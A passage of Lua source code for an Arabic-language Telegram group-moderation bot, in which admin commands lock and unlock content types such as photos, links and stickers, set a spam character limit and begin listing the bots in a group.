absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:inline:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱۄنلٱين بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الصور" then
if not DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـصـۄر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:photo:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـصـۄر بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الكلايش" then
if not DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـكـلٱيش بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:spam:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـكـلٱيش بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الفيديو" then
if not DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـفيډيۄ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفيډيۄ بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "المتحركه" then
if not DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـمتحركة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمتحركة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الاغاني" then
if not DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱلٱغـٱنـي بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:music:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱغـٱنـي بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الصوت" then
if not DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـصۄت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:voice:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـصۄت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الروابط" then
if not DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـرۄٱبط بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـرۄٱبط بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "المواقع" then
if not DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـمۄٱقع بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:location:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمۄٱقع بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "المعرف" then
if not DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـمعرف بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'tags:lock'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمعرف بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الحمايه" then
if not DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـحمٱية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:strict'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـحمٱية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الملفات" then
if not DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـمٌلفـآټ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:document:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمٌلفـآټ بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الهاشتاك" then
if not DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـهٱشتٱك بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:abstag:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـهٱشتٱك بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الجهات" then
if not DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـجهٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:contact:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️☬︙ٱڵـجهٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الشبكات" then
if not DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـشبكٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:webpage:mute'..msg.chat_id_,true) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـشبكٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "العربيه" then
if not DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـعربية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:arabic:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعربية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الانكليزيه" then
if not DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱلٱنكڵيزيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:english:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱنكڵيزيه بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الملصقات" then
if not DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵمڵصقٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمڵصقٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الماركداون" then
if not DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵمٱركدٱون بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'markdown:lock'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمٱركدٱون بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الاشعارات" then
if not DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱلٱشعٱرٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:tgservice:jk'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱشعٱرٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "التوجيه" then
if not DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـتوجيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتوجيه بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and Abbas_Abs(msg) then
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutepts[2] == "الدردشه" then
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـډرډشة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:text:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـډرډشة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الصور" then
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـصـۄر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:photo:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـصـۄر بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الكلايش" then
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـكـلٱيش بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:spam:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـكـلٱيش بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الفيديو" then
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـفيډيۄ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:video:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفيډيۄ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الملفات" then
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـمٌلفـآټ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:document:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمٌلفـآټ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الاونلاين" then
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱلٱۄنلٱين بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:inline:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱۄنلٱين بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الماركداون" then
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵمٱركدٱون بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'markdown:lock'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمٱركدٱون بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "المتحركه" then
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـمتحركة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:gifs:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمتحركة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الاغاني" then
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱلٱغـٱنـي بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:music:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱغـٱنـي بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الصوت" then
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـصۄت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:voice:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـصۄت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الروابط" then
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـرۄٱبط بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:links:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـرۄٱبط بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "المواقع" then
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـمۄٱقع بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:location:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمۄٱقع بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "المعرف" then
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـمعرف بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'tags:lock'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمعرف بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الحمايه" then
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـحمٱية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:strict'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـحمٱية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الهاشتاك" then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـهٱشتٱك بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:abstag:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـهٱشتٱك بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الجهات" then
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـجهٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:contact:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـجهٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الشبكات" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـشبكٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:webpage:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـشبكٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "العربيه" then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـعربية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:arabic:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعربية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الانكليزيه" then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱلٱنكڵيزيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:english:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱنكڵيزيه بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الاشعارات" then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱلٱشعٱرٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:tgservice:jk'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱشعٱرٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "الملصقات" then
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵمڵصقٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:sticker:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵمڵصقٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unmutepts[2] == "التوجيه" then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـتوجيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:forward:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتوجيه بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع عدد الاحرف (%d+)$") and Abbas_Abs(msg) then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱختر عدد ٱكبر من ( 40 ) حـرف ', 1, 'md')
else
DevAbs:set(DevProx..'bot:sens:spam'..msg.chat_id_,sensspam[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم وضع عدد ٱلٱحـرف : ( '..sensspam[2]..' )\n☬︙ٱذٱ كٱنت ٱڵرسٱڵة تحتوي عڵى ٱكثر من ( '..sensspam[2]..' ) حرف سيتم حذفهٱ تڵقٱئيٱ بوٱسطة ٱڵـبوت ', 1, 'md')
end
end
end
--     Source DevProx     --
if text == "كشف البوتات" and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then 
local function cb(extra,result,success)
local admins = result.members_  
text = '☬︙*قائمة ٱڵبوتٱت ٱڵحٱڵيه* ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ❪✯❫'
end
text = text.."⌯ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙*لٱتوجد بوتٱت هنٱ*\n ", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙*عدد ٱڵبوتٱت هنٱ* ↫ ❪'..n..'❫ \n'
